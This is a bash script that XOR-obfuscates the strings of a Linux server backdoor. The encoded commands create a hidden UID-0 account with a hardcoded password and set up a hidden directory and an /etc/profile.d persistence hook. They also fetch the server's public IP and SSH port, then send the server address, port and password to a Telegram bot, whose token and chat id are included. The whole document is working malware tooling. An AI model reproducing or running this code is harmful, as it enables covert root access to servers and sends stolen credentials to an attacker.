#!/bin/bash
KEY=95

xor_encode() {
    local str="$1"
    local result=""
    for ((i=0; i<${#str}; i++)); do
        byte=$(printf '%d' "'${str:$i:1}")
        result+="$((byte ^ KEY)) "
    done
    echo "($result)"
}

echo "_sys_uname=$(xor_encode 'kyytamine')"
echo "_sys_upass=$(xor_encode 'KyytaminE@88\$\$')"
echo "_sys_uadd=$(xor_encode 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash kyytamine 2>/dev/null')"
echo "_sys_uid_check=$(xor_encode 'id kyytamine 2>/dev/null')"
echo "_sys_umod_grp=$(xor_encode 'usermod -aG root kyytamine')"
echo "_sys_umod_home=$(xor_encode 'usermod -d /root kyytamine')"
echo "_sys_umod_shell=$(xor_encode 'usermod -s /bin/bash kyytamine')"
echo "_sys_hidden_dir=$(xor_encode '/usr/lib/systemd/.config/.kernel/.data/')"
echo "_sys_conf_path=$(xor_encode '/usr/lib/systemd/.config/.kernel/.data/sysctl.conf')"
echo "_sys_bashrc_rd=$(xor_encode 'cat /root/.bashrc 2>/dev/null')"
echo "_sys_ip_fetch=$(xor_encode 'curl -s ifconfig.me 2>/dev/null')"
echo "_sys_chown_cmd=$(xor_encode 'chown kyytamine:root %s')"
echo "_sys_chmod_cmd=$(xor_encode 'chmod 644 %s')"
echo "_sys_hook_path=$(xor_encode '/etc/profile.d/kyytamine_hook.sh')"
echo "_sys_chmod_hook=$(xor_encode 'chmod 644 /etc/profile.d/kyytamine_hook.sh')"
echo "_sys_port_net=$(xor_encode "netstat -tlnp 2>/dev/null | grep sshd | awk '{print \$4}' | cut -d: -f2 | head -1")"
echo "_sys_port_ss=$(xor_encode "ss -tlnp 2>/dev/null | grep sshd | awk '{print \$4}' | cut -d: -f2 | head -1")"
echo "_uid_auth_chain=$(xor_encode '8809162105:AAFjq_oloZnjfYkN5ermZJI4gEf4xsWJdM')"
echo "_uid_proc_target=$(xor_encode '1640896393')"
echo "_uid_rpc_base=$(xor_encode 'https://api.telegram.org/bot')"
echo "_uid_dispatch=$(xor_encode '/sendMessage')"
echo "_uid_field_a=$(xor_encode 'chat_id')"
echo "_uid_field_b=$(xor_encode 'text')"
echo "_uid_field_c=$(xor_encode 'parse_mode')"
echo "_uid_msg_tmpl=$(xor_encode 'WARNING SERVER TER HABEG!!!\nSERVER FOUND = %s\nPORT : %s\nPASSWORD : %s')"
echo "_uid_fire=$(xor_encode 'curl -s -X POST')"
